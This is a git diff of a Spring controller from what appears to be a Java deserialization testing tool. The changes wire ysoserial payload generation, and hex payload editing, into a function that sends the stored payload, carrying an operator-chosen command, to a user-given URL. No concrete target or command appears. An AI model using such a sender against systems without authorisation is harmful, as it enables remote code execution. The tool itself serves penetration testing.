@@ -3,7 +3,6 @@ package pw.inz.serializationcenter.controllers;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.MediaType;
-import org.springframework.scheduling.annotation.Async;
 import org.springframework.scheduling.annotation.EnableAsync;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
@@ -19,7 +18,6 @@ import pw.inz.serializationcenter.webscanner.WebScanner;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.util.Map;
-import java.util.concurrent.CompletableFuture;
 
 @Controller
 @EnableAsync
@@ -33,6 +31,7 @@ public class MainController {
     String appName;
     String desString;
 
+    byte[] payload;
     String gadgets;
     String scanResult;
 
@@ -90,13 +89,27 @@ AC ED 00 05 73 72 00 0A 53 65 72 69 61 6C 54 65
         model.addAttribute("scanResult", scanResult);
         return "WebScanner";
     }
+    @RequestMapping("/webscanner/send")
+    public String webScannerSend(Model model) {
+        model.addAttribute("appName", appName);
+        model.addAttribute("scanResult", scanResult);
+        return "WebScanner";
+    }
 
     @PostMapping(path = "/webscanner/scan", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
     public String  scanURL(@RequestParam String url,@RequestParam String request)  {
-        scanResult= webScanner.doScan(url,request);
-        System.out.println(scanResult);
-        return "redirect:/webscanner.html";
+        if(payload == null) {
+            scanResult = webScanner.doScan(url, request);
+            System.out.println(scanResult);
+            return "redirect:/webscanner.html";
+        } else {
+            webScanner.sendPayload(url,request,payload);
+            scanResult = "Send successfully...";
+            payload = null;
+            return "redirect:/webscanner.html";
+        }
     }
+
 
     @RequestMapping("/payloadgenerator.html")
     public String payloadGenerator(Model model) {
@@ -106,13 +119,20 @@ AC ED 00 05 73 72 00 0A 53 65 72 69 61 6C 54 65
     }
 
     @PostMapping(path = "/payloadgenerator/generate", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
-    public void generatePayload(@RequestParam String payloadname, @RequestParam String payloadcmd,
-                                ModelMap model, HttpServletResponse response) throws Exception {
-        byte[] a = ysoserialPass.invoke(payloadname, payloadcmd);
-        response.getOutputStream().write(a);
-        response.setHeader("Content-disposition", "attachment; filename=payload_" + payloadname + payloadcmd);
-        response.getOutputStream().flush();
+    public String generatePayload(@RequestParam String payloadname, @RequestParam String payloadcmd,
+                                  @RequestParam String action, ModelMap model, HttpServletResponse response) throws Exception {
+        if(action.equals("submit")) {
+            byte[] a = ysoserialPass.invoke(payloadname, payloadcmd);
+            response.getOutputStream().write(a);
+            response.setHeader("Content-disposition", "attachment; filename=payload_" + payloadname + payloadcmd);
+            response.getOutputStream().flush();
+        }
+        else if(action.equals("send")){
+            payload = ysoserialPass.invoke(payloadname, payloadcmd);
+            return  "redirect:/webscanner/send";
+        }
 
+        return  null;
     }
 
     @GetMapping("/payloadeditor.html")
@@ -123,11 +143,17 @@ AC ED 00 05 73 72 00 0A 53 65 72 69 61 6C 54 65
     }
 
     @PostMapping(path = "/payloadeditor.html", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
-    public String printPayload(@RequestParam String payload,
+    public String printPayload(@RequestParam String payload,@RequestParam String action,
                                ModelMap model) throws Exception {
-        desString = sd.main(new String[]{payload});
-        model.addAttribute("desString", desString);
-        return "redirect:/payloadeditor.html";
+        if(action.equals("print")) {
+            desString = sd.main(new String[]{payload});
+            model.addAttribute("desString", desString);
+            return "redirect:/payloadeditor.html";
+        } else if (action.equals("send")){
+            this.payload = sd.hexStrToBytes(payload.replaceAll("[\s\r\n]", "").toUpperCase());
+            return "redirect:/webscanner.html";
+        }
+        return null;
     }
 
     @PostMapping(path = "/payloadeditor/save", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
